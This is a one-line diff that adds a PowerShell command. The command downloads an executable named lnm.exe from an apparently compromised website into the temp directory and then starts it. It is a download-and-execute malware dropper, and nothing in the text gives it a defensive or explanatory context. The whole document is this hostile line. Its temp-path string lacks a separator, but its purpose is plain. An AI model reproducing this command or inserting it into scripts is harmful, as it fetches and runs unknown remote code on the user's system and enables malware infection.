@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://www.athensheartcenter.com/crm/cgi-bin/lnm.exe',"$env:TEMPlnm.exe");Start-Process ("$env:TEMPlnm.exe")
